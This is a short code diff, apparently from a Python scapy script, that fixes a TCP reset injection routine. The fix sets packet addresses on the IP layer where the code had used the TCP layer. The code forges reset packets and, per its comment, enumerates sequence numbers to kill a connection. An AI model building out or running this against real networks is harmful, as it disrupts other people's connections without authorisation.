@@ -11,12 +11,12 @@ def pkt_callback(packet):
             #set ack number
             ack = resetPkt[TCP].ack
             seq = resetPkt[TCP].seq
-            dst = resetPkt[TCP].dst
-            src = resetPkt[TCP].src
+            dst = resetPkt[IP].dst
+            src = resetPkt[IP].src
             resetPkt[TCP].ack = seq
             resetPkt[TCP].seq = ack
-            resetPkt[TCP].src = dst
-            resetPkt[TCP].dst = src
+            resetPkt[IP].src = dst
+            resetPkt[IP].dst = src
             sendp(resetPkt)
             #now enumerate through possible sequence numbers to try and kill the connection
 
